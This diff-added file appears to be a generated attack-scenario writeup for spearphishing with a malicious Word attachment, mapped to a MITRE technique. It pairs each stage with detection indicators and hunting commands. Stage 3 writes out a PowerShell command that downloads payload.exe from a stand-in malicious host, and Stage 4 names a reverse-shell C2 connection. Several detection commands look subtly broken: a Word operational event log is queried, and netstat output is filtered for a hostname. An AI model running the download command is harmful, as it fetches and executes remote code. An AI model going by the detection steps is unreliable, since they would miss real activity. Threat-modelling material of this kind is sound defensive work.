@@ -1,0 +1,83 @@
+<output>
+Pattern Name: T1566.001 - Spearphishing Attachment
+
+Scenario Overview: This attack scenario illustrates how an attacker uses a spearphishing email with a malicious attachment to gain initial access to a victim's system. The attack progresses through multiple stages, involving email clients, web browsers, and office applications, ultimately leading to the execution of a payload that establishes persistence and allows for further exploitation.
+
+Attack Flow Breakdown:
+
+**Stage 1: Initial Access via Spearphishing Email**
+- **Application Involved**: Outlook
+- **User Action**: The victim receives a spearphishing email that appears to be from a trusted source, containing a malicious attachment (e.g., a Word document).
+- **Key Artifacts**: 
+  - Email Subject: "Important Update"
+  - Attachment: `Invoice.docx`
+- **Detection Indicators**:
+  - Monitor for emails with suspicious attachments or from unknown senders.
+  - Analyze email headers for anomalies.
+
+```shell
+# Example command to extract email headers for analysis
+grep -i "Important Update" /var/log/mail.log
+```
+
+**Stage 2: Opening the Malicious Attachment**
+- **Application Involved**: Microsoft Word
+- **User Action**: The victim opens the attachment, triggering a macro that downloads a malicious payload.
+- **Key Artifacts**: 
+  - Document Path: `C:\Users\Victim\Downloads\Invoice.docx`
+  - Macro Execution: `AutoOpen()`
+- **Detection Indicators**:
+  - Monitor for the execution of macros in Word documents.
+  - Analyze logs for document access patterns.
+
+```shell
+# Example command to check for macro execution in Word
+Get-WinEvent -LogName "Microsoft-Windows-Word/Operational" | Where-Object { $_.Message -like "*AutoOpen*" }
+```
+
+**Stage 3: Payload Download and Execution**
+- **Application Involved**: PowerShell
+- **User Action**: The macro executes a PowerShell command to download a malicious executable from a remote server.
+- **Key Artifacts**: 
+  - PowerShell Command: `Invoke-WebRequest -Uri http://malicious-server.com/payload.exe -OutFile C:\Users\Victim\AppData\Local\Temp\payload.exe`
+  - Download Path: `C:\Users\Victim\AppData\Local\Temp\payload.exe`
+- **Detection Indicators**:
+  - Monitor for PowerShell commands that download executables.
+  - Analyze network traffic for connections to known malicious domains.
+
+```shell
+# Example command to monitor PowerShell downloads
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object { $_.Message -like "*Invoke-WebRequest*" }
+```
+
+**Stage 4: Execution of the Malicious Payload**
+- **Application Involved**: Windows Explorer
+- **User Action**: The victim's system executes the downloaded payload, which establishes a reverse shell connection to the attacker's command and control server.
+- **Key Artifacts**: 
+  - Executable Path: `C:\Users\Victim\AppData\Local\Temp\payload.exe`
+  - C2 Connection: `POST http://attacker-server.com/shell`
+- **Detection Indicators**:
+  - Monitor for unusual outbound connections from the victim's machine.
+  - Analyze process creation logs for the execution of the payload.
+
+```shell
+# Example command to check for outbound connections
+netstat -an | findstr "attacker-server.com"
+```
+
+**Stage 5: Establishing Persistence**
+- **Application Involved**: Task Scheduler
+- **User Action**: The payload modifies the Task Scheduler to ensure it runs on system startup.
+- **Key Artifacts**: 
+  - Task Name: `MaliciousTask`
+  - Command: `C:\Users\Victim\AppData\Local\Temp\payload.exe`
+- **Detection Indicators**:
+  - Monitor for new scheduled tasks created by non-administrative users.
+  - Analyze Task Scheduler logs for unusual task configurations.
+
+```shell
+# Example command to list scheduled tasks
+schtasks /query /fo LIST /v | findstr "MaliciousTask"
+```
+
+</output>
